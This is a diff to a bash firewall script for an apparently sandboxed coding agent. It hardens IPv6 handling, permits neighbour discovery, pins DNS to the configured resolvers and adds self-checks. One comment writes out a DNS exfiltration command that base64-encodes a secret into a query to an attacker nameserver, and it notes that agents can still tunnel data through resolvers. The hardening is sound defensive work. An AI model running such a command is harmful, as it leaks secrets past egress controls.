@@ -49,8 +49,19 @@ if [ "$HAVE_IP6TABLES" = 0 ]; then
   log "WARN: ip6tables unavailable; no global IPv6 on this box, so nothing to contain."
 fi
 
-# Run an ip6tables command only when v6 filtering is available.
-ip6() { [ "$HAVE_IP6TABLES" = 1 ] && ip6tables "$@"; return 0; }
+# Run an ip6tables command when v6 filtering is available — and DIE if it fails.
+#
+# This wrapper used to end in an unconditional `return 0`, which made every ip6tables
+# error invisible: under errexit a failed `-P OUTPUT DROP` was simply skipped and the
+# script carried on, leaving the v6 policy at its default ACCEPT. That is a silent
+# fail-open, and it is silent in exactly the case this code claims to defend — a box
+# with no v6 address yet, where the self-verify below never runs the v6 probe, so
+# nothing would ever notice that the "defensive" v6 policy had not been installed.
+# A rule we cannot install is a rule we do not have. Say so, and stop.
+ip6() {
+  [ "$HAVE_IP6TABLES" = 1 ] || return 0
+  ip6tables "$@" || die "ip6tables $* failed — refusing to run with an unenforced IPv6 policy"
+}
 
 # Active egress groups (host-set; empty = minimal / core-only). A group-tagged
 # firewall.conf line is honored only when its group is listed here. NB: do NOT name
@@ -99,17 +110,63 @@ if [ -n "$DOCKER_DNS_RULES" ]; then
   echo "$DOCKER_DNS_RULES" | xargs -L 1 iptables -t nat
 fi
 
-# --- Baseline: loopback + DNS (needed to resolve the allowlist), both families ---
+# --- Baseline: loopback ---
 iptables -A OUTPUT -o lo -j ACCEPT
 iptables -A INPUT  -i lo -j ACCEPT
-iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
-iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT
-iptables -A INPUT  -p udp --sport 53 -j ACCEPT
 ip6 -A OUTPUT -o lo -j ACCEPT
 ip6 -A INPUT  -i lo -j ACCEPT
-ip6 -A OUTPUT -p udp --dport 53 -j ACCEPT
-ip6 -A OUTPUT -p tcp --dport 53 -j ACCEPT
-ip6 -A INPUT  -p udp --sport 53 -j ACCEPT
+
+# --- ICMPv6: neighbour discovery ---
+# IPv6 is not IPv4 with longer addresses: ND (RFC 4861) replaces ARP, and it rides on
+# ICMPv6. A box that cannot exchange NS/NA never learns its router's link-layer address
+# and has NO working IPv6 at all, so an allowlisted domain that only resolves over v6
+# becomes unreachable and the v6 allowlist below is decorative.
+#
+# It costs no containment: the allowlist is enforced on TCP/443 regardless, and ND is
+# link-local by construction. RFC 4890 §4.4.1 says permit these. Note this box does NOT
+# need them under the default rootless-podman/pasta engine (pasta terminates traffic in
+# userspace, so there is no link layer to discover, and v6 works without these rules —
+# verified). They matter on a real bridge, i.e. Docker or rootful podman with IPv6
+# enabled, where without them v6 breaks CLOSED: curl silently falls back to IPv4 and the
+# only symptom is that everything got slower.
+#
+# ICMPv6 errors (packet-too-big for PMTUD, dest-unreachable) are deliberately NOT listed:
+# conntrack already accepts them as RELATED to the flow that provoked them.
+for t in router-solicitation router-advertisement \
+         neighbour-solicitation neighbour-advertisement; do
+  ip6 -A OUTPUT -p icmpv6 --icmpv6-type "$t" -j ACCEPT
+  ip6 -A INPUT  -p icmpv6 --icmpv6-type "$t" -j ACCEPT
+done
+
+# --- DNS: ONLY to the resolvers this box is actually configured to use ---
+# Port 53 used to be open to ANY destination, which is a hole big enough to drive the
+# whole threat model through: `dig @attacker-ns.example $(base64 <secret).evil.com`
+# exfiltrates in plain sight, over an allowed port, to an attacker-chosen server, and a
+# default-DROP egress firewall never sees a thing.
+#
+# Pinning to /etc/resolv.conf's nameservers does NOT eliminate DNS exfiltration — an
+# agent can still tunnel data as query names through the legitimate resolver to a
+# hostile authoritative server, and no allowlist of resolvers can stop that. What it
+# does remove is the trivial channel: the agent no longer picks the destination, so the
+# data must pass through the resolver you already trust (which logs, caches, and is very
+# often not the attacker's). Narrowing, not closing. Named so nobody mistakes it.
+NAMESERVERS=()
+while read -r ns; do [ -n "$ns" ] && NAMESERVERS+=("$ns"); done < <(
+  awk '/^[[:space:]]*nameserver[[:space:]]/ {print $2}' /etc/resolv.conf 2>/dev/null || true
+)
+[ ${#NAMESERVERS[@]} -eq 0 ] && die "no nameserver in /etc/resolv.conf — cannot resolve the allowlist"
+for ns in "${NAMESERVERS[@]}"; do
+  if [[ "$ns" =~ $IP_REGEX ]]; then
+    iptables -A OUTPUT -p udp -d "$ns" --dport 53 -j ACCEPT
+    iptables -A OUTPUT -p tcp -d "$ns" --dport 53 -j ACCEPT
+  elif [[ "$ns" =~ $IP6_REGEX ]]; then
+    ip6 -A OUTPUT -p udp -d "$ns" --dport 53 -j ACCEPT
+    ip6 -A OUTPUT -p tcp -d "$ns" --dport 53 -j ACCEPT
+  else
+    log "WARN: ignoring unparseable nameserver '$ns'"
+  fi
+done
+log "dns: pinned to ${#NAMESERVERS[@]} configured resolver(s)"
 
 # --- Resolve allowlist domains into per-family ipsets ---
 # A and AAAA both: a domain reachable over v6 must be allowed over v6, or Claude breaks
@@ -156,7 +213,9 @@ if group_active github; then
     while read -r cidr; do
       if [[ "$cidr" =~ $CIDR6_REGEX ]]; then ipset add github-ranges-v6 "$cidr" 2>/dev/null || true; fi
     done < <(echo "$gh_cidrs" | grep ':' || true)
-    log "github ranges loaded (v4: $(ipset list github-ranges | grep -c '^[0-9]' || true), v6: $(ipset list github-ranges-v6 | grep -c ':' || true))"
+    # Count actual members. `ipset list | grep -c ':'` would also count every header
+    # line (Name:, Type:, Size in memory: ...), so the v6 figure was inflated by ~8.
+    log "github ranges loaded (v4: $(ipset save github-ranges | grep -c '^add ' || true), v6: $(ipset save github-ranges-v6 | grep -c '^add ' || true))"
   else
     log "WARN: could not load GitHub ranges"
   fi
@@ -216,6 +275,22 @@ if [ "$HAVE_V6_ADDR" = 1 ]; then
     die "egress NOT contained over IPv6 — reached example.com. The v6 rules did not take effect."
   fi
   log "OK: example.com blocked (IPv6)"
+
+  # Positive control for v6. "example.com is blocked over IPv6" is only evidence of
+  # containment if IPv6 WORKS in the first place: a box whose v6 stack is broken passes
+  # the check above for entirely the wrong reason — and would go on passing it on the day
+  # a real leak appears. So prove the v6 path is live by reaching something we do allow
+  # over it. A dead v6 path is degraded, not unsafe (curl falls back to v4), so this
+  # warns rather than aborts.
+  if [ "$(ipset save allowed-domains-v6 | grep -c '^add ' || true)" -gt 0 ]; then
+    if curl -6 --connect-timeout 5 -s https://api.anthropic.com >/dev/null 2>&1; then
+      log "OK: allowlisted host reachable over IPv6 (so the v6 block above is the firewall, not a dead stack)"
+    else
+      log "WARN: IPv6 is configured but no allowlisted host answered over it — the v6 path"
+      log "WARN: looks broken, so 'example.com blocked (IPv6)' proves little. Claude will"
+      log "WARN: still work over IPv4."
+    fi
+  fi
 else
   log "OK: no global IPv6 on this box (nothing to contain)"
 fi
